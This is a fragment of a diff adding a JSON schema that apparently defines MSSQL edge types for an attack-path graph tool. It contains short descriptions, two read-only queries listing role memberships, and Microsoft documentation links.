+            "content": "Role membership is a static relationship. Actions performed using role permissions are logged based on the specific operation, not the role membership itself.\n\nTo view current role memberships at server level:\n\n```text\nSELECT r.name AS RoleName, m.name AS MemberName FROM sys.server_role_members rm JOIN sys.server_principals r ON rm.role_principal_id = r.principal_id JOIN sys.server_principals m ON rm.member_principal_id = m.principal_id ORDER BY r.name, m.name;\n```\n\nTo view current role memberships at database level:\n\n```text\nSELECT r.name AS RoleName, m.name AS MemberName FROM sys.database_role_members rm JOIN sys.database_principals r ON rm.role_principal_id = r.principal_id JOIN sys.database_principals m ON rm.member_principal_id = m.principal_id ORDER BY r.name, m.name;\n```"
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-ver17](https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-ver17)\n- [https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-ver17](https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-ver17)\n- [https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-server-role-members-transact-sql?view=sql-server-ver17](https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-server-role-members-transact-sql?view=sql-server-ver17)\n- [https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-database-role-members-transact-sql?view=sql-server-ver17](https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-database-role-members-transact-sql?view=sql-server-ver17)"
+          }
+        }
+      }
+    },
+    {
+      "name": "MSSQL_Owns",
+      "description": "",
+      "is_traversable": true
+    },
+    {
+      "name": "MSSQL_ServiceAccountFor",
+      "description": "",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "This domain account runs the SQL Server service."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "The service account context determines SQL Server's access to network resources and local system privileges."
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "The service account context determines SQL Server's access to system resources and file permissions."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "Service account changes require service restart and are logged in Windows event logs."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-ver17](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-ver17)"
+          }
+        }
+      }
+    },
+    {
+      "name": "MSSQL_TakeOwnership",
+      "description": "",
+      "is_traversable": false
+    }
+  ],
+  "environments": [
+    {
+      "environment_kind": "MSSQL_Server",
+      "source_kind": "MSSQL",
+      "principal_kinds": [
+        "MSSQL_ApplicationRole",
+        "MSSQL_Database",
+        "MSSQL_DatabaseRole",
+        "MSSQL_DatabaseUser",
+        "MSSQL_Login",
+        "MSSQL_Server",
+        "MSSQL_ServerRole"
+      ]
+    }
+  ],
+  "relationship_findings": []
+}
